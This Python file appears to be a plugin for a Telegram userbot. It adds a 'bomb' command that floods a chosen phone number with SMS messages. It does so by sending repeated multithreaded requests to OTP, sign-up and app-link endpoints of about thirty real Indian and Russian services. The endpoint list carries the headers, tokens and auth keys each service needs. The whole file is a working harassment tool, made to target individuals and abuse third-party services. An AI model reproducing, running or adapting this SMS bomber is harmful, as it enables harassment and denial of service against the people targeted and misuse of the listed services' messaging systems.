from concurrent.futures import ThreadPoolExecutor
import json
import requests
import random
import time
import argparse
import os
import httpx
import sys
import textwrap
import urllib3
from main_startup.core.decorators import friday_on_cmd
from main_startup.helper_func.basic_helpers import edit_or_reply, get_text, edit_or_send_as_file, get_user


VERIFY = True
not VERIFY and urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class CustomArgumentParser(argparse.ArgumentParser):
    def __init__(self, *args, width=80, **kwargs):
        self.program = {key: kwargs[key] for key in kwargs}
        self.positionals = []
        self.options = []
        self.width = width
        super(CustomArgumentParser, self).__init__(*args, **kwargs)

    def add_argument(self, *args, **kwargs):
        super(CustomArgumentParser, self).add_argument(*args, **kwargs)
        argument = {key: kwargs[key] for key in kwargs}
        if len(args) == 0 or (
            len(args) == 1 and isinstance(args[0], str) and not args[0].startswith("-")
        ):
            argument["name"] = args[0] if (len(args) > 0) else argument["dest"]
            self.positionals.append(argument)
            return
        argument["flags"] = [item for item in args]
        self.options.append(argument)

    def format_usage(self):
        if "usage" in self.program:
            prefix = "Usage: "
            wrapper = textwrap.TextWrapper(width=self.width, break_long_words=False)
            wrapper.initial_indent = prefix
            wrapper.subsequent_indent = len(prefix) * " "
            if self.program["usage"] == "" or str.isspace(self.program["usage"]):
                return wrapper.fill("No usage information available")
            return wrapper.fill(self.program["usage"])
        output = []
        left1 = "Usage: "
        left2 = (
            self.program["prog"]
            if (
                "prog" in self.program
                and self.program["prog"] != ""
                and not str.isspace(self.program["prog"])
            )
            else os.path.basename(sys.argv[0])
            if (
                len(sys.argv[0]) > 0
                and sys.argv[0] != ""
                and not str.isspace(sys.argv[0])
            )
            else "script.py"
        )
        llen = len(left1) + len(left2)
        arglist = []
        for option in self.options:
            flags = str.join("/", option["flags"])
            arglist += [
                "[%s]" % flags
                if (
                    "action" in option
                    and (
                        option["action"] == "store_true"
                        or option["action"] == "store_false"
                    )
                )
                else "[%s %s]" % (flags, option["metavar"])
                if ("metavar" in option)
                else "[%s %s]" % (flags, option["dest"].upper())
                if ("dest" in option)
                else "[%s]" % flags
            ]
        for positional in self.positionals:
            arglist += [
                "%s" % positional["metavar"]
                if ("metavar" in positional)
                else "%s" % positional["name"]
            ]
        right = str.join(" ", arglist)

        lwidth = llen
        rwidth = max(0, self.width - lwidth - 1)
        if lwidth > int(self.width / 2) - 1:
            lwidth = max(0, int(self.width / 2) - 1)
            rwidth = int(self.width / 2)
        outtmp = "%-" + str(lwidth) + "s %s"

        # Wrap text for left and right parts, split into separate lines
        wrapper = textwrap.TextWrapper(width=lwidth)
        wrapper.initial_indent = left1
        wrapper.subsequent_indent = len(left1) * " "
        left = wrapper.wrap(left2)
        wrapper = textwrap.TextWrapper(width=rwidth)
        right = wrapper.wrap(right)

        # Add usage message to output
        for i in range(0, max(len(left), len(right))):
            left_ = left[i] if (i < len(left)) else ""
            right_ = right[i] if (i < len(right)) else ""
            output.append(outtmp % (left_, right_))

        # Return output as single string
        return str.join("\n", output)

    def format_help(self):
        output = []
        dewrapper = textwrap.TextWrapper(width=self.width)

        # Add description to output if present
        if (
            "description" in self.program
            and self.program["description"] != ""
            and not str.isspace(self.program["description"])
        ):
            output.append("")
            output.append(dewrapper.fill(self.program["description"]))
            output.append("")

        # Add usage message to output
        output.append(self.format_usage())

        # Determine what to display left and right for each argument, determine max
        # string lengths for left and right
        lmaxlen = rmaxlen = 0
        for positional in self.positionals:
            positional["left"] = (
                positional["metavar"]
                if ("metavar" in positional)
                else positional["name"]
            )
        for option in self.options:
            if "action" in option and (
                option["action"] == "store_true" or option["action"] == "store_false"
            ):
                option["left"] = str.join(", ", option["flags"])
            else:
                option["left"] = str.join(
                    ", ",
                    [
                        "%s %s" % (item, option["metavar"])
                        if ("metavar" in option)
                        else "%s %s" % (item, option["dest"].upper())
                        if ("dest" in option)
                        else item
                        for item in option["flags"]
                    ],
                )
        for argument in self.positionals + self.options:
            if (
                "help" in argument
                and argument["help"] != ""
                and not str.isspace(argument["help"])
                and "default" in argument
                and argument["default"] != argparse.SUPPRESS
            ):
                argument["right"] = (
                    argument["help"]
                    + " "
                    + (
                        "(default: '%s')" % argument["default"]
                        if isinstance(argument["default"], str)
                        else "(default: %s)" % str(argument["default"])
                    )
                )
            elif (
                "help" in argument
                and argument["help"] != ""
                and not str.isspace(argument["help"])
            ):
                argument["right"] = argument["help"]
            elif "default" in argument and argument["default"] != argparse.SUPPRESS:
                argument["right"] = (
                    "Default: '%s'" % argument["default"]
                    if isinstance(argument["default"], str)
                    else "Default: %s" % str(argument["default"])
                )
            else:
                # argument["right"] = ""
                argument["right"] = "No description available"
            lmaxlen = max(lmaxlen, len(argument["left"]))
            rmaxlen = max(rmaxlen, len(argument["right"]))
        lwidth = lmaxlen
        rwidth = max(0, self.width - lwidth - 4)
        if lwidth > int(self.width / 2) - 4:
            lwidth = max(0, int(self.width / 2) - 4)
            rwidth = int(self.width / 2)
        # outtmp = "  %-" + str(lwidth) + "s  %-" + str(rwidth) + "s"
        outtmp = "  %-" + str(lwidth) + "s  %s"

        # Wrap text for left and right parts, split into separate lines
        lwrapper = textwrap.TextWrapper(width=lwidth)
        rwrapper = textwrap.TextWrapper(width=rwidth)
        for argument in self.positionals + self.options:
            argument["left"] = lwrapper.wrap(argument["left"])
            argument["right"] = rwrapper.wrap(argument["right"])

        # Add positional arguments to output
        if len(self.positionals) > 0:
            output.append("")
            output.append("Positional arguments:")
            for positional in self.positionals:
                for i in range(
                    0, max(len(positional["left"]), len(positional["right"]))
                ):
                    left = (
                        positional["left"][i] if (i < len(positional["left"])) else ""
                    )
                    right = (
                        positional["right"][i] if (i < len(positional["right"])) else ""
                    )
                    output.append(outtmp % (left, right))

        # Add option arguments to output
        if len(self.options) > 0:
            output.append("")
            output.append("Optional arguments:")
            for option in self.options:
                for i in range(0, max(len(option["left"]), len(option["right"]))):
                    left = option["left"][i] if (i < len(option["left"])) else ""
                    right = option["right"][i] if (i < len(option["right"])) else ""
                    output.append(outtmp % (left, right))

        # Add epilog to output if present
        if (
            "epilog" in self.program
            and self.program["epilog"] != ""
            and not str.isspace(self.program["epilog"])
        ):
            output.append("")
            output.append(dewrapper.fill(self.program["epilog"]))
            output.append("")

        # Return output as single string
        return str.join("\n", output)

    # Method redefined as format_usage() does not return a trailing newline like
    # the original does
    def print_usage(self, file=None):
        if file is None:
            file = sys.stdout
        file.write(self.format_usage() + "\n")
        file.flush()

    # Method redefined as format_help() does not return a trailing newline like
    # the original does
    def print_help(self, file=None):
        if file is None:
            file = sys.stdout
        file.write(self.format_help() + "\n")
        file.flush()

    def error(self, message):
        sys.stderr.write(self.format_usage() + "\n")
        sys.stderr.write(("[ERROR] %s" % message) + "\n")
        sys.exit(2)


class APIRequestsHandler:
    def __init__(
        self,
        target,
        timeout,
        proxy={},
        verbose=False,
        verify=False,
        cc="91",
        config=None,
    ):
        self.config = config
        self.target = target
        self.headers = self._headers()
        self.done = False
        self.proxy = proxy
        self.cookies = self._cookies()
        self.verbose = verbose
        self.verify = verify
        self.timeout = timeout
        self.cc = cc
        self.client = httpx.Client(http2=True, proxies=self.proxy, verify=VERIFY)

    def _headers(self):
        tmp_headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
        }
        if "headers" in self.config:
            tmp_headers.update(self.config["headers"])
        return tmp_headers

    def _cookies(self):
        tmp_cookies = {}
        if "cookies" in self.config:
            tmp_cookies.update(self.config["cookies"])
        return tmp_cookies

    def _data(self):
        tmp_data = {}
        for key, value in self.config["data"].items():
            tmp_data[key] = value.format(cc=self.cc, target=self.target)
        return tmp_data

    def _params(self):
        tmp_params = {}
        if "params" in self.config:
            for key, value in self.config["params"].items():
                tmp_params[key] = value.format(cc=self.cc, target=self.target)
        return tmp_params

    def _get(self):
        try:
            return self.client.get(
                self.config["url"],
                params=self.params,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
            )
        except:
            raise

    def _post(self):
        try:
            return self.client.post(
                self.config["url"],
                data=self.data,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
            )
        except:
            raise

    def start(self):
        try:
            if self.config["method"] == "GET":
                self.params = self._params()
                self.resp = self._get()
            elif self.config["method"] == "POST":
                self.data = self._data()
                self.resp = self._post()
            self.done = True
        except Exception as error:
            (self.verbose or self.verify) and print(
                "{:<13}: ERROR".format(self.config["name"])
            )
            self.verbose and print("Error text: {}".format(error))

    def status(self):
        if self.config["identifier"] in self.resp.text:
            (self.verbose or self.verify) and print(
                "{:<13}: OK".format(self.config["name"])
            )
            return True
        else:
            (self.verbose or self.verify) and print(
                "{:<13}: FAIL".format(self.config["name"])
            )
            self.verbose and print("Response: {}".format(self.resp.text))
            return False
m=None
failed, success = 0, 0
no_of_sms=0


@friday_on_cmd(['bomb', 'sms_bomb'],
               cmd_help={
                'help': 'atack with massive sms bombs',
                'example': '{ch}bomb 9848411000 : 100'})
async def geT_if(client, message):
    def bomber(p):
        global failed, success, no_of_sms,m
        if p is None or success > no_of_sms:
            return
        elif not p.done:
            try:
                p.start()
                if p.status():
                    success += 1
                else:
                    failed += 1
            except:
                failed += 1
        k="Requests: "+str(success+failed)+" | Success: "+str(success)+" | Failed: "+str(failed)
        printMessage(k)
    async def printMessage(k):
        await m.edit(l+"\n"+k)
    global failed, success, no_of_sms,m
    m = await edit_or_reply(message, "`Please Wait!`")
    input_str = get_text(message)
    target,no_of_sms=input_str.split(":")
    data={"version":"3.0","created_by":"Datta07","providers":{"91":[{"name":"confirmtkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/register","params":{"newOtp":"true","mobile_number":"{target}"},"identifier":"false"},{"name":"justdial","method":"GET","url":"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php","params":{"mobile":"{target}"},"identifier":"sent"},{"name":"myupchar","method":"GET","url":"https://www.myupchar.com/consultation/store_otp","headers":{"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept":"*/*","Accept-Language":"en-US,en;q=0.5","X-CSRF-Token":"PVsJG4MoiKTLl7RA2KLYzXVoSt2s2URRSlCV3ADvm6M=","X-Requested-With":"XMLHttpRequest","Connection":"keep-alive","Referer":"https://www.myupchar.com/consultation/query","DNT":"1"},"params":{"phone":"{target}"},"identifier":"आपके मोबाइल नंबर पर OTP भेज दिया गया है।"},{"name":"frotels","method":"POST","url":"https://www.frotels.com/appsendsms.php","data":{"mobno":"{target}"},"identifier":"sent"},{"name":"gapoon","method":"POST","url":"https://www.gapoon.com/userSignup","data":{"mobile":"{target}","email":"a@a.com","name":"a"},"identifier":"1"},{"name":"housing","method":"POST","url":"https://login.housing.com/api/v2/send-otp","data":{"phone":"{target}"},"identifier":"Sent"},{"name":"porter","method":"POST","url":"https://porter.in/restservice/send_app_link_sms","data":{"phone":"{target}","referrer_string":"","brand":"porter"},"identifier":"true"},{"name":"cityflo","method":"POST","url":"https://cityflo.com/website-app-download-link-sms/","data":{"mobile_number":"{target}"},"identifier":"sent"},{"name":"nnnow","method":"POST","url":"https://api.nnnow.com/d/api/appDownloadLink","data":{"mobileNumber":"{target}"},"identifier":"true"},{"name":"ajio","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","data":{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{target}","requestType":"SENDOTP"},"identifier":"1"},{"name":"happyeasygo","method":"GET","url":"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do","params":{"phone":"91%20{target}"},"identifier":"true"},{"name":"unacademy","method":"POST","url":"https://unacademy.com/api/v1/user/get_app_link/","data":{"phone":"{target}"},"identifier":"sent"},{"name":"treebo","method":"POST","url":"https://www.treebo.com/api/v2/auth/login/otp/","data":{"phone_number":"{target}"},"identifier":"sent"},{"name":"mobikwik","method":"POST","url":"https://webapi.mobikwik.com/p/account/otp/cell/v2","data":{"cell":"{target}"},"headers":{"X-MClient":"0"},"identifier":"true"},{"name":"airtel","method":"GET","url":"https://www.airtel.in/referral-api/core/notify","params":{"messageId":"map","rtn":"{target}"},"identifier":"Success"},{"name":"pharmeasy","method":"POST","url":"https://pharmeasy.in/api/auth/requestOTP","data":{"contactNumber":"{target}"},"identifier":"resendSmsCounter"},{"name":"mylescars","method":"POST","url":"https://www.mylescars.com/usermanagements/chkContact","data":{"contactNo":"{target}"},"identifier":"success@::::"},{"name":"grofers","method":"POST","url":"https://grofers.com/v2/accounts/","data":{"user_phone":"{target}"},"headers":{"auth_key":"3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"},"identifier":"We have sent"},{"name":"dream11","method":"POST","url":"https://api.dream11.com/sendsmslink","data":{"siteId":"1","mobileNum":"{target}","appType":"androidfull"},"identifier":"true"},{"name":"cashify","method":"GET","url":"https://www.cashify.in/api/cu01/v1/app-link","params":{"mn":"{target}"},"identifier":"Successfully"},{"name":"paytm","method":"POST","url":"https://commonfront.paytm.com/v4/api/sendsms","data":{"phone":"{target}","guid":"2952fa812660c58dc160ca6c9894221d"},"identifier":"202"}],"multi":[{"name":"flipkart","method":"POST","cc_target":"loginId","url":"https://www.flipkart.com/api/5/user/otp/generate","data":{"loginId":"+{target}"},"headers":{"X-user-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop","Origin":"https://www.flipkart.com","Content-Type":"application/x-www-form-urlencoded"},"identifier":"emailMask"},{"name":"qlean","method":"POST","url":"https://qlean.ru/clients-api/v2/sms_codes/auth/request_code","data":{"phone":"{cc}{target}"},"identifier":"request_id"},{"name":"mail.ru","method":"POST","url":"https://cloud.mail.ru//api/v2/notify/applink","data":{"phone":"+{cc}{target}","api":"2","email":"email","x-email":"x-email"},"identifier":"200"},{"name":"gotinder","method":"POST","url":"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru","data":{"phone_number":"{cc}{target}"},"identifier":"200"},{"name":"youla.ru","method":"POST","url":"https://youla.ru/web-api/auth/request_code","data":{"phone":"+{cc}{target}"},"identifier":"code_length"},{"name":"ivi.ru","method":"POST","url":"https://api.ivi.ru/mobileapi/user/register/phone/v6","data":{"phone":"{cc}{target}"},"identifier":"true"},{"name":"delitime.ru","method":"POST","url":"https://api.delitime.ru/api/v2/signup","data":{"SignupForm[username]":"{cc}{target}","SignupForm[device_type]":"3"},"identifier":"true"},{"name":"icq.com","method":"POST","url":"https://www.icq.com/smsreg/requestPhoneValidation.php","data":{"msisdn":"{cc}{target}","locale":"en","k":"ic1rtwz1s1Hj1O0r","r":"45559"},"identifier":"200"}]}}
    target = target.strip()
    country_code = str(91)
    no_of_threads = 5
    no_of_sms = int(no_of_sms.strip())
    failed, success = 0, 0
    l="Target: "+target+" | Threads: "+str(no_of_threads)+" | SMS-Bombs: "+str(no_of_sms)
    await m.edit(l)
    start = time.time()
    providers = data["providers"]
    with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
        while success <= no_of_sms:
            p = APIRequestsHandler(
                target,
                proxy=None,
                verbose=None,
                timeout=None,
                cc=country_code,
                config=random.choice(
                    providers[country_code] + providers["multi"]
                    if country_code in providers
                    else providers["multi"]
                ),
            )
            executor.submit(bomber, p)
